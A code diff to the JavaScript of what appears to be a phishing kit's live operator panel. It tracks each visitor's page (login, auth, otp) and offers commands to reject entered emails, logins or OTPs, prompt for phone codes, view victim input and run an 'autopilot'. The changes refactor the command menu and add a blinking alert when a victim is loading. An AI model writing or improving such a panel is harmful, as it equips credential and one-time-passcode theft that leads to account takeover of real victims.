@@ -217,9 +217,13 @@
       const cleanPage = (u.page || "").replace(/\//g, "").toLowerCase();
 
       let incorrectOption = "";
-      if (cleanPage === "login") incorrectOption = `<option value="bad-email">Bad email</option>`;
-      if (cleanPage === "auth") incorrectOption = `<option value="bad-login">Bad Login</option>`;
-      else if (cleanPage === "otp") incorrectOption = `<option value="bad-otp">Bad OTP</option>`;
+      if (cleanPage === "login") {
+	  incorrectOption = `<option value="bad-email">Bad email</option>`;
+	} else if (cleanPage === "auth") {
+	  incorrectOption = `<option value="bad-login">Bad Login</option>`;
+	} else if (cleanPage === "otp") {
+	  incorrectOption = `<option value="bad-otp">Bad OTP</option>`;
+	}
 
       const row = document.createElement("tr");
 
@@ -298,24 +302,13 @@
       }
 
       tbody.appendChild(row);
+       if (u.status === "load" || u.status === "loading") {
+		  triggerBlink(u.id);
+		}
     });
   });
   
-
-  // ✅ Toggle OTP visibility
-  function toggleOtpInput(userId) {
-    const select = document.getElementById(`cmd-${userId}`);
-    const input = document.getElementById(`ph-otp-${userId}`);
-    
-    console.log("select value", select.value);
-
-    if (select.value === "phone-otp" || select.value === "prompt"){
-        input.style.display = "inline-block";
-    } else {
-        input.style.display = "none";
-    }
-}
-
+  
   // ✅ Send admin command
   function sendCommand(userId) {
     const select = document.getElementById(`cmd-${userId}`);
@@ -339,6 +332,37 @@
     otpInput.style.display = "none";
     otpInput.value = "";
   }
+  
+  function toggleOtpInput(id) {
+	  const cmd = document.getElementById(`cmd-${id}`).value;
+	  const otpInput = document.getElementById(`ph-otp-${id}`);
+	  const dot = document.getElementById(`dot-${id}`);
+	
+	  if (cmd === "phone-otp" || cmd === "prompt") {
+	    otpInput.style.display = "inline-block";
+	    dot.style.display = "none";
+	  } else {
+	    otpInput.style.display = "none";
+	    dot.style.display = "none";
+	  }
+	}
+	
+	
+	function triggerBlink(id) {
+	  const dot = document.getElementById(`dot-${id}`);
+	  if (!dot) return;
+	  
+	  dot.classList.remove("blink"); 
+	  void dot.offsetWidth;
+	  
+	  dot.style.display = "inline-block";
+	  dot.classList.add("blink");
+	
+	  setTimeout(() => {
+	    dot.classList.remove("blink");
+	    dot.style.display = "none";
+	  }, 5000); 
+	}
 
   // ✅ Modal view for user input
   function viewInput(userId) {
@@ -536,36 +560,7 @@ autopilotBtn.addEventListener("click", async () => {
 
 getAutopilotState();
 
-function toggleOtpInput(id) {
-  const cmd = document.getElementById(`cmd-${id}`).value;
-  const otpInput = document.getElementById(`ph-otp-${id}`);
-  const dot = document.getElementById(`dot-${id}`);
 
-  if (cmd === "phone-otp") {
-    otpInput.style.display = "inline-block";
-    dot.style.display = "none";
-  } else {
-    otpInput.style.display = "none";
-    dot.style.display = "none"; // hidden by default until triggered
-  }
-}
-
-
-function triggerBlink(id) {
-  const dot = document.getElementById(`dot-${id}`);
-  if (!dot) return;
-  
-  dot.classList.remove("blink"); 
-  void dot.offsetWidth;
-  
-  dot.style.display = "inline-block";
-  dot.classList.add("blink");
-
-  setTimeout(() => {
-    dot.classList.remove("blink");
-    dot.style.display = "none";
-  }, 5000); 
-}
 </script> 
 
 </body>
